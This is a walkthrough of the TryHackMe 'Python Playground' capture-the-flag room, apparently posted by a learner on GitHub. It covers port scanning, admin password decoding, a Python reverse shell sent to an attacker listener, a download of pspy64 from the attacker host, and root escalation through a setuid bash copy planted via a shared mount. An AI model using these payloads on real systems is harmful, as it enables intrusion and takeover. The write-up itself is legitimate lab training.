<h1 align="center">Python Playground</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/f479f098-6da3-4093-bbde-218c41169cc8"><br>
2025, September 9<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>491</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Be creative</em>!<br>
Access it <a href="https://tryhackme.com/room/pythonplayground"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/19cf9795-f523-4578-81c5-17fa886e150e"></p>


<h2>Task 1 . Hack it!</h2>
<p>Jump in and grab those flags! They can all be found in the usual places (<code>/home/someuser</code> and <code>/root</code>).</p>


<p><em>Answer the questions below</em></p>


<br>
<br>
<h2 align="center">nmap</h2>

```bash
:~/PythonPlayground# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
```

```bash
:~/PythonPlayground# nmap -sC -sV -A -p- -T4 xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
```

<p>

- /admin.html: Possible admin folder<br>
- /login.html: Possible admin folder<br>
- CVE:CVE-2007-6750 . Slowloris DOS attack<br>
- CVE-2011-3192 . Apache byterange filter DoS</p>

```bash
:~/PythonPlayground# nmap -sC -sV -A -p80 -script vuln -T4 xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Node.js Express framework
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin.html: Possible admin folder
|_  /login.html: Possible admin folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.tenable.com/plugins/nessus/55976
```

<h2 align="center">login.html, signup.html, admin.thml</h2>

```bash
:~/PythonPlayground# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://xx.xxx.xx.64/FUZZ.html -mc 200 -fs 941

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xxx.xx.xx/FUZZ.html
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 941
________________________________________________

login                   [Status: 200, Size: 549, Words: 152, Lines: 19]
signup                  [Status: 200, Size: 549, Words: 152, Lines: 19]
admin                   [Status: 200, Size: 3134, Words: 667, Lines: 118]
:: Progress: [218275/218275] :: Job [1/1] :: 20793 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```


<h2 align="center">port 80</h2>
<p>

- login.html
- signup.html</p>

<img width="1058" height="345" alt="image" src="https://github.com/user-attachments/assets/135df330-149a-4f01-b994-2fbbbc97b3f1" />

<br>
<br>

<img width="1058" height="458" alt="image" src="https://github.com/user-attachments/assets/ede37b43-ebb6-40b7-9aea-7489081f08a5" />

<br>
<br>
<h2 align="center">/admin.html</h2>

<img width="1053" height="442" alt="image" src="https://github.com/user-attachments/assets/e632b584-b213-4b56-a449-c3b030dc5c3f" />

<br>
<br>
<p>

- username = connor<br>
- dxee*************************xefdxdudueqduerdvdtdvdu<br>
- super-secret-admin-testing-panel.html</p>

<img width="1063" height="715" alt="image" src="https://github.com/user-attachments/assets/10b6f266-2fcb-490e-add8-2161b6419968" />

<br>
<br>


```bash
:~/PythonPlayground# cat a.py
#!/usr/bin/python
import math

#  int to text 
def int_array_to_text(arr):
    txt = ''
    for i in range(0,len(arr)):
        txt += (chr(arr[i] + 97))
    return txt

# String to array implementation
def string_to_int_array(text):
    tmp = []
    for i in text:
        charcode = ord(i)
        part_a = math.floor(charcode/26)
        part_b = charcode % 26
        tmp.append(part_a)
        tmp.append(part_b)
    return tmp

# array_to_string
def array_to_string(arr):
    txt = ''
    length = int(len(arr))
    for i in range(0,length,2):
        txt += (chr(arr[i]*26+arr[i+1]))
    return txt


# text to array
def text_to_array(txt):
    tmp = []
    for i in txt:
        tmp.append(ord(i) - 97)
    return(tmp)

print(array_to_string(text_to_array(array_to_string(text_to_array('dxee*************************xefdxdudueqduerdvdtdvdu')))))
```

```bash
:~/PythonPlayground# python3 a.py
*************
```

<br>
<br>
<h2 align="center">/super-secret-admin-testing-panel.html</h2>

<img width="1057" height="816" alt="image" src="https://github.com/user-attachments/assets/9f3825b0-2a81-43c6-831f-3b2531efe1f7" />

<br>
<br>

<img width="1036" height="623" alt="image" src="https://github.com/user-attachments/assets/114a3066-928b-4d27-a5c1-594ab31ea4e8" />

<br>
<br>

```bash
print(Hello TryHackMe)
```

<img width="1037" height="391" alt="image" src="https://github.com/user-attachments/assets/18eaddc6-a519-4e44-a8d5-747fc871e77c" />

<br>
<br>

```bash
:~/PythonPlayground# nc -nlvp 9001
Listening on 0.0.0.0 9001
```

```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("xx.xxx.xx.xxx",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

<img width="1037" height="400" alt="image" src="https://github.com/user-attachments/assets/cb851454-6e48-438d-b767-a2f0baf058f8" />

<br>
<br>

<img width="1032" height="230" alt="image" src="https://github.com/user-attachments/assets/0a00cfdd-e327-461c-b180-ce29f5b03746" />

<br>
<br>

<img width="1027" height="140" alt="image" src="https://github.com/user-attachments/assets/b93a4b2f-c6a4-4e9e-97d9-3bd5131f57ad" />


```bash
// Let the tab key work :)

        var textareas = document.getElementsByTagName('textarea');
        var count = textareas.length;
        for(var i=0;i<count;i++){
            textareas[i].onkeydown = function(e){
                if(e.keyCode==9 || e.which==9){
                    e.preventDefault();
                    var s = this.selectionStart;
                    this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
                    this.selectionEnd = s+1; 
                }
            }
        }
```

<br>
<br>

```bash
import	socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("xx.xxx.xx.xxx",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

<img width="1044" height="230" alt="image" src="https://github.com/user-attachments/assets/b1eb0544-cbd3-4eb4-86c4-bee27b8c2cda" />

<br>
<br>

<img width="1024" height="511" alt="image" src="https://github.com/user-attachments/assets/42f62ba4-1320-4f9f-9ce7-2bb670d70f6f" />

<br>
<br>


```bash
:~/PythonPlayground# nc -nlvp 9001
...
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/root/app
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@playgroundweb:~/app# ^Z
[3]+  Stopped                 nc -nlvp 9001
:~/PythonPlayground# stty raw -echo; fg
nc -nlvp 9001

root@playgroundweb:~/app# export TERM=xterm
```

```bash
root@playgroundweb:~/app# ll
total 52
drwxr-xr-x  1 root root  4096 May 16  2020 ./
drwx------  1 root root  4096 May 16  2020 ../
-rw-rw-r--  1 root root  2057 May 16  2020 index.js
drwxr-xr-x 52 root root  4096 May 16  2020 node_modules/
-rw-rw-r--  1 root root 14292 May 16  2020 package-lock.json
-rw-rw-r--  1 root root   262 May 16  2020 package.json
drwxr-xr-x  1 root root  4096 Sep  9 xx:xx scripts/
drwxr-xr-x  3 root root  4096 May 16  2020 static/
```

```bash
root@playgroundweb:~/app# cd ..
```

```bash
root@playgroundweb:~# ls
app  flag1.txt
```

```bash
root@playgroundweb:~# cat flag1.txt
THM{*******************************}
```

<br>
<p>1.1. What is flag 1? Hint : <em>Jump in and grab those flags! They can all be found in the usual places (/home/someuser and /root)</em>.<br>
<code>THM{*******************************}</code><br>
<br>


<p>

- dockerenv</p>

```bash
root@playgroundweb:/# ls -la
total 60
drwxr-xr-x   1 root root 4096 May 16  2020 .
drwxr-xr-x   1 root root 4096 May 16  2020 ..
-rwxr-xr-x   1 root root    0 May 16  2020 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  340 Sep  9 xx:xx dev
drwxr-xr-x   1 root root 4096 May 16  2020 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr 23  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Apr 23  2020 media
drwxr-xr-x   1 root root 4096 May 16  2020 mnt
drwxr-xr-x   2 root root 4096 Apr 23  2020 opt
dr-xr-xr-x 106 root root    0 Sep  9 xx:xx proc
drwx------   1 root root 4096 May 16  2020 root
drwxr-xr-x   1 root root 4096 Apr 24  2020 run
lrwxrwxrwx   1 root root    8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root    0 Sep  9 xx:xx sys
drwxrwxrwt   1 root root 4096 May 16  2020 tmp
drwxr-xr-x   1 root root 4096 Apr 23  2020 usr
drwxr-xr-x   1 root root 4096 Apr 23  2020 var
```

```bash
root@playgroundweb:~/app/node_modules# ls
accepts              escape-html        mime            safer-buffer
array-flatten        etag               mime-db         send
body-parser          express            mime-types      serve-static
bytes                finalhandler       ms              setprototypeof
content-disposition  forwarded          negotiator      statuses
content-type         fresh              on-finished     toidentifier
cookie               http-errors        parseurl        type-is
cookie-signature     iconv-lite         path-to-regexp  unpipe
debug                inherits           proxy-addr      utils-merge
depd                 ipaddr.js          qs              vary
destroy              media-typer        range-parser
ee-first             merge-descriptors  raw-body
encodeurl            methods            safe-buffer
```

```bash
root@playgroundweb:/mnt# ll
total 12
drwxr-xr-x 1 root root 4096 May 16  2020 ./
drwxr-xr-x 1 root root 4096 May 16  2020 ../
drwxrwxr-x 9 root  106 4096 May 11  2020 log/
```

```bash
root@playgroundweb:/mnt/log# ll
total 3900
drwxrwxr-x  9 root        106    4096 May 11  2020 ./
drwxr-xr-x  1 root root          4096 May 16  2020 ../
-rw-r--r--  1 root root         27163 May 11  2020 alternatives.log
drwxr-xr-x  2 root root          4096 May 16  2020 apt/
-rw-r-----  1  102 adm          40564 Sep  9 xx:xx auth.log
-rw-r--r--  1 root root         56751 Feb  3  2020 bootstrap.log
-rw-rw----  1 root utmp          1920 May 12  2020 btmp
-rw-r--r--  1 root root         40909 Sep  9 xx:xx cloud-init-output.log
-rw-r--r--  1  102 adm         896734 Sep  9 xx:xx cloud-init.log
drwxr-xr-x  2 root root          4096 Jan 24  2020 dist-upgrade/
-rw-r--r--  1 root root        508605 May 16  2020 dpkg.log
-rw-r--r--  1 root root         32032 May 11  2020 faillog
drwxr-xr-x  3 root root          4096 May 11  2020 installer/
drwxr-sr-x+ 3 root messagebus    4096 May 11  2020 journal/
-rw-r-----  1  102 adm         809295 Sep  9 xx:xx kern.log
drwxr-xr-x  2  108        112    4096 May 11  2020 landscape/
-rw-rw-r--  1 root utmp        292292 May 16  2020 lastlog
drwxr-xr-x  2 root root          4096 Nov 23  2018 lxd/
-rw-r-----  1  102 adm        1461475 Sep  9 xx:xx syslog
-rw-------  1 root root         64064 May 11  2020 tallylog
drwxr-x---  2 root adm           4096 May 11  2020 unattended-upgrades/
-rw-rw-r--  1 root utmp         47232 Sep  9 xx:xx wtmp
```

```bash
May 11 22:10:57 pythonplayground useradd[883]: new group: name=connor, GID=1000
May 11 22:10:57 pythonplayground useradd[883]: new user: name=connor, UID=1000, GID=1000, home=/home/connor, shell=/bin/bash
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to group 'adm'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to group 'cdrom'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to group 'sudo'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to group 'dip'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to group 'plugdev'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to group 'lxd'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to shadow group 'adm'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to shadow group 'cdrom'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to shadow group 'sudo'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to shadow group 'dip'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to shadow group 'plugdev'
May 11 22:10:57 pythonplayground useradd[883]: add 'connor' to shadow group 'lxd'
May 11 22:10:57 pythonplayground systemd-logind[908]: New seat seat0.
May 11 22:10:57 pythonplayground systemd-logind[908]: Watching system buttons on /dev/input/event0 (Power Button)
May 11 22:10:57 pythonplayground systemd-logind[908]: Watching system buttons on /dev/input/event1 (Sleep Button)
May 11 22:10:57 pythonplayground systemd-logind[908]: Watching system buttons on /dev/input/event2 (AT Translated Set 2 keyboard)
May 11 22:10:59 pythonplayground sshd[1206]: Server listening on 0.0.0.0 port 22.
May 11 22:10:59 pythonplayground sshd[1206]: Server listening on :: port 22.
May 11 22:11:04 pythonplayground systemd-logind[908]: Watching system buttons on /dev/input/event0 (Power Button)
May 11 22:11:04 pythonplayground systemd-logind[908]: Watching system buttons on /dev/input/event1 (Sleep Button)
May 11 22:11:04 pythonplayground systemd-logind[908]: Watching system buttons on /dev/input/event2 (AT Translated Set 2 keyboard)
May 11 22:11:12 pythonplayground sshd[1206]: Received signal 15; terminating.
May 11 22:11:12 pythonplayground sshd[1528]: Server listening on 0.0.0.0 port 22.
May 11 22:11:12 pythonplayground sshd[1528]: Server listening on :: port 22.
May 11 22:15:23 pythonplayground login[1055]: pam_unix(login:session): session opened for user connor by LOGIN(uid=0)
May 11 22:15:23 pythonplayground systemd: pam_unix(systemd-user:session): session opened for user connor by (uid=0)
```

```bash
:~/PythonPlayground# ssh connor@playground
...
connor@playground's password: 
...
connor@pythonplayground:~$ id
uid=1000(connor) gid=1000(connor) groups=1000(connor)
connor@pythonplayground:~$ pwd
/home/connor
```

```bash
connor@pythonplayground:~$ ls -la
total 36K
drwxr-xr-x 4 connor connor 4.0K May 16  2020 .
drwxr-xr-x 3 root   root   4.0K May 11  2020 ..
-rw-r--r-- 1 connor connor  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 connor connor 3.8K May 11  2020 .bashrc
drwx------ 2 connor connor 4.0K May 11  2020 .cache
-rw-rw-r-- 1 connor connor   38 May 16  2020 flag2.txt
drwx------ 3 connor connor 4.0K May 11  2020 .gnupg
-rw-r--r-- 1 connor connor  807 Apr  4  2018 .profile
-rw-rw-r-- 1 connor connor   40 May 11  2020 .vimrc

connor@pythonplayground:~$ cat flag2.txt
THM{*******************************}
```

<br>
<p>1.2. What is flag 2? Hint : You're going to need to get some credentials<br>
<code>THM{*******************************}</code></p>
<br>


```bash
connor@pythonplayground:~$ sudo -l
[sudo] password for connor: 
Sorry, user connor may not run sudo on pythonplayground.
```

```bash
connor@pythonplayground:/var/log/assessment$ find / -perm -u=s -type f 2>/dev/null
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/at
/usr/bin/traceroute6.iputils
/var/log/assessment/bash
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
```

```bash
connor@pythonplayground:/tmp$ wget http://xx.xxx.xx.xxx:8000/pspy64 -O pspy64
```

```bash
connor@pythonplayground:/tmp$ chmod +x pspy64
```

```bash
connor@pythonplayground:/tmp$ ./pspy64
```

<img width="1175" height="631" alt="image" src="https://github.com/user-attachments/assets/0905d3d4-d87a-4706-952d-d48464a1369f" />

<br>
<br>
<p>

- node</p>

```bash
root@playgroundweb:/mnt/log# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2612   604 ?        Ss   xx:xx   0:00 /bin/sh -c node
root         7  3.2  8.3 644816 82060 ?        Sl   xx:xx   2:08 node index.js
root        23  0.0  0.9  13248  9688 ?        S    xx:xx   0:00 python3 scripts
root        24  0.0  0.0   2612   600 ?        S    xx:xx   0:00 /bin/sh -i
```

<br>
<br>

```bash
root@playgroundweb:/mnt/log# mkdir assessment
```

```bash
root@playgroundweb:/mnt/log# chmod 777 assessment/
```

```bash
root@playgroundweb:/mnt/log# ls -la assessment/
total 8
drwxrwxrwx  2 root root 4096 Sep 9 xx:xx .
drwxrwxr-x 10 root  106 4096 Sep 9 xx:xx ..
```

<br>

```bash
connor@pythonplayground:/var/log$ cd assessment
```

```bash
connor@pythonplayground:/var/log/assessment$ ls
```

```bash
connor@pythonplayground:/var/log/assessment$ cp /bin/bash bash
```

```bash
connor@pythonplayground:/var/log/assessment$ ls -la
total 1096
drwxrwxrwx  2 root   root      4096 Sep 9 xx:xx .
drwxrwxr-x 10 root   syslog    4096 Sep 9 xx:xx ..
-rwxr-xr-x  1 connor connor 1113504 Sep 9 xx:xx bash
```

```bash
root@playgroundweb:/mnt/log/assessment# chown root:root bash
```

```bash
root@playgroundweb:/mnt/log/assessment# chmod 4755 bash
```

```bash
connor@pythonplayground:/var/log/assessment$ ./bash -p
bash-4.4# id
uid=1000(connor) gid=1000(connor) euid=0(root) groups=1000(connor)
bash-4.4# pwd
/var/log/assessment
bash-4.4# cd /root
bash-4.4# ls
flag3.txt
bash-4.4# cat flag3.txt
THM{*******************************}
```

<br>
<p>1.3. What is flag 3?<br>
<code>THM{*******************************}</code></p>
<br>
<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d950d9ad-ee52-40a5-986b-d1550eb3ae4b"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/557cccd4-160a-4360-94d3-14f2937d3973"></p>

<h2 align="center">My TryHackMe Journey</h2>


<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 9       |Hard 🚩 - <code><strong>Python Playground</strong></code>| 491| 111ˢᵗ | 5ᵗʰ   |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
| 2025, Sep 9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486    |      113ʳᵈ   |	    5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |   940    |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   112ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/b038b6ee-1e9a-4966-bb42-57aac87a3f90"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/8f7f0673-390b-4edc-9707-6f61913cb4b0"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/90036076-ddfe-4bae-b0e6-439222e11e20"><br>
                  Global monthly:    693ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/225fa3c4-0914-4e80-94bf-f282252d1b03"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/eae02176-4e19-4f69-9a7f-a60fb77cb80b"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
